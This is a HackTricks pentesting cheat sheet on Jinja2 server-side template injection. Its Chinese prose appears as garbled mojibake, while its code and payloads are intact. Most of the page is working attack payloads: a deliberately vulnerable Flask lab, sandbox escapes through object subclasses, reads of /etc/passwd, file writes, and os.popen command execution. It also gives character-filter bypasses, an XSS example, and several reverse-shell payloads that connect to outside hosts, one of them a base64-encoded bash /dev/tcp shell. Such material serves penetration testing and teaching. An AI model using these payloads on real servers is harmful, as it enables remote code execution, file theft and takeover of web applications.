# Jinja2 SSTI

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## **å®éªŒå®¤**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **æ‚é¡¹**

### **è°ƒè¯•è¯­å¥**

å¦‚æœå¯ç”¨äº†è°ƒè¯•æ‰©å±•ï¼Œå°†ä¼šæœ‰ä¸€ä¸ª`debug`æ ‡ç­¾å¯ç”¨äºå°†å½“å‰ä¸Šä¸‹æ–‡ä»¥åŠå¯ç”¨çš„è¿‡æ»¤å™¨å’Œæµ‹è¯•è¾“å‡ºã€‚è¿™å¯¹äºåœ¨æ¨¡æ¿ä¸­æŸ¥çœ‹å¯ç”¨å†…å®¹è€Œä¸éœ€è¦è®¾ç½®è°ƒè¯•å™¨éå¸¸æœ‰ç”¨ã€‚
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}





</pre>
```
æºç ï¼š[https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)

### **è½¬å‚¨æ‰€æœ‰é…ç½®å˜é‡**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}




```
## **Jinjaæ³¨å…¥**

é¦–å…ˆï¼Œåœ¨Jinjaæ³¨å…¥ä¸­ï¼Œæ‚¨éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥**é€ƒç¦»æ²™ç›’**å¹¶æ¢å¤å¯¹å¸¸è§„Pythonæ‰§è¡Œæµçš„è®¿é—®ã€‚ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦**æ»¥ç”¨**æ¥è‡ª**éæ²™ç›’ç¯å¢ƒ**ä½†åœ¨æ²™ç›’å†…å¯è®¿é—®çš„**å¯¹è±¡**ã€‚

### è®¿é—®å…¨å±€å¯¹è±¡

ä¾‹å¦‚ï¼Œåœ¨ä»£ç `render_template("hello.html", username=username, email=email)`ä¸­ï¼Œusernameå’Œemailå¯¹è±¡**æ¥è‡ªéæ²™ç›’çš„Pythonç¯å¢ƒ**ï¼Œå¹¶ä¸”å°†åœ¨**æ²™ç›’ç¯å¢ƒå†…å¯è®¿é—®**ã€‚\
\*\*\*\*æ­¤å¤–ï¼Œè¿˜æœ‰å…¶ä»–ä¸€äº›å¯¹è±¡å°†å§‹ç»ˆåœ¨æ²™ç›’ç¯å¢ƒä¸­å¯è®¿é—®ï¼Œè¿™äº›å¯¹è±¡åŒ…æ‹¬ï¼š
```
[]
''
()
dict
config
request
```
### æ¢å¤ \<class 'object'>

ç„¶åï¼Œä»è¿™äº›å¯¹è±¡ä¸­ï¼Œæˆ‘ä»¬éœ€è¦è·å–åˆ°ç±»ï¼š**`<class 'object'>`**ï¼Œä»¥ä¾¿å°è¯•**æ¢å¤**å·²å®šä¹‰çš„**ç±»**ã€‚è¿™æ˜¯å› ä¸ºä»è¿™ä¸ªå¯¹è±¡ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨**`__subclasses__`**æ–¹æ³•ï¼Œå¹¶**è®¿é—®éæ²™ç›’**Pythonç¯å¢ƒä¸­çš„æ‰€æœ‰ç±»ã€‚

ä¸ºäº†è®¿é—®è¿™ä¸ª**å¯¹è±¡ç±»**ï¼Œä½ éœ€è¦**è®¿é—®ä¸€ä¸ªç±»å¯¹è±¡**ï¼Œç„¶åè®¿é—®**`__base__`**ï¼Œ**`__mro__()[-1]`**æˆ–è€…**`.`**`mro()[-1]`**ã€‚ç„¶åï¼Œåœ¨åˆ°è¾¾è¿™ä¸ª**å¯¹è±¡ç±»**ä¹‹åï¼Œæˆ‘ä»¬**è°ƒç”¨** **`__subclasses__()`**ã€‚

è¯·æŸ¥çœ‹ä»¥ä¸‹ç¤ºä¾‹ï¼š
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}






# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCEé€ƒé€¸

**æ¢å¤äº†** `<class 'object'>` å¹¶è°ƒç”¨äº† `__subclasses__`ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨è¿™äº›ç±»æ¥è¯»å†™æ–‡ä»¶å’Œæ‰§è¡Œä»£ç ã€‚

è°ƒç”¨ `__subclasses__` ç»™äº†æˆ‘ä»¬**è®¿é—®æ•°ç™¾ä¸ªæ–°å‡½æ•°çš„æœºä¼š**ï¼Œæˆ‘ä»¬åªéœ€è®¿é—®**æ–‡ä»¶ç±»**æ¥**è¯»å†™æ–‡ä»¶**ï¼Œæˆ–è€…è®¿é—®ä»»ä½•å…·æœ‰è®¿é—®**å…è®¸æ‰§è¡Œå‘½ä»¤**çš„ç±»ï¼ˆå¦‚`os`ï¼‰ã€‚

**è¯»/å†™è¿œç¨‹æ–‡ä»¶**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰**
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Calling os.popen without guessing the index of the class

{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


```
è¦äº†è§£å¯ä»¥ç”¨æ¥é€ƒé€¸çš„æ›´å¤šç±»ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹ï¼š

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### è¿‡æ»¤å™¨ç»•è¿‡

#### å¸¸è§ç»•è¿‡æ–¹æ³•

è¿™äº›ç»•è¿‡æ–¹æ³•å°†å…è®¸æˆ‘ä»¬**è®¿é—®**å¯¹è±¡çš„**å±æ€§**ï¼Œè€Œæ— éœ€ä½¿ç”¨æŸäº›å­—ç¬¦ã€‚\
æˆ‘ä»¬å·²ç»åœ¨ä¹‹å‰çš„ç¤ºä¾‹ä¸­çœ‹åˆ°äº†å…¶ä¸­ä¸€äº›ç»•è¿‡æ–¹æ³•ï¼Œä½†åœ¨è¿™é‡Œæˆ‘ä»¬è¿›è¡Œæ€»ç»“ï¼š
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}




```
* [**ç‚¹å‡»æ­¤å¤„è¿”å›ä»¥è®¿é—®å…¨å±€å¯¹è±¡çš„æ›´å¤šé€‰é¡¹**](jinja2-ssti.md#accessing-global-objects)
* [**ç‚¹å‡»æ­¤å¤„è¿”å›ä»¥è®¿é—®å¯¹è±¡ç±»çš„æ›´å¤šé€‰é¡¹**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**é˜…è¯»æ­¤å¤„ä»¥è·å–æ— éœ€å¯¹è±¡ç±»çš„RCE**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**é¿å…HTMLç¼–ç **

å‡ºäºå®‰å…¨åŸå› ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒFlaskä¼šå¯¹æ¨¡æ¿ä¸­çš„æ‰€æœ‰å†…å®¹è¿›è¡ŒHTMLç¼–ç ï¼š
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**`safe` è¿‡æ»¤å™¨** å…è®¸æˆ‘ä»¬å°† JavaScript å’Œ HTML æ³¨å…¥åˆ°é¡µé¢ä¸­ï¼Œè€Œä¸ä¼šè¿›è¡Œ HTML ç¼–ç ï¼Œå°±åƒè¿™æ ·ï¼š
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**é€šè¿‡ç¼–å†™æ¶æ„é…ç½®æ–‡ä»¶å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ã€‚**
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## æ²¡æœ‰å‡ ä¸ªå­—ç¬¦

æ²¡æœ‰ **`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`**
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}



```
## æ²¡æœ‰ **\<class 'object'>** çš„ Jinja æ³¨å…¥

ä»[**å…¨å±€å¯¹è±¡**](jinja2-ssti.md#è®¿é—®å…¨å±€å¯¹è±¡)ä¸­ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•å¯ä»¥å®ç°**æ— éœ€ä½¿ç”¨è¯¥ç±»**çš„**è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰**ã€‚\
å¦‚æœä½ æˆåŠŸè®¿é—®åˆ°è¿™äº›å…¨å±€å¯¹è±¡ä¸­çš„ä»»ä½•**å‡½æ•°**ï¼Œä½ å°±èƒ½å¤Ÿè®¿é—®**`__globals__.__builtins__`**ï¼Œä»è€Œå®ç°éå¸¸**ç®€å•**çš„**RCE**ã€‚

ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ä»å¯¹è±¡**`request`**ã€**`config`**å’Œä»»ä½•å…¶ä»–æœ‰è®¿é—®æƒé™çš„**å…¨å±€å¯¹è±¡**ä¸­**æŸ¥æ‰¾å‡½æ•°**ï¼š
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
ä¸€æ—¦ä½ æ‰¾åˆ°äº†ä¸€äº›å‡½æ•°ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æ¢å¤å†…ç½®å‡½æ•°ï¼š
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}

## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
## å‚è€ƒèµ„æ–™

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* åœ¨è¿™é‡Œæ£€æŸ¥[attr trickæ¥ç»•è¿‡é»‘åå•å­—ç¬¦](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3)ã€‚
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
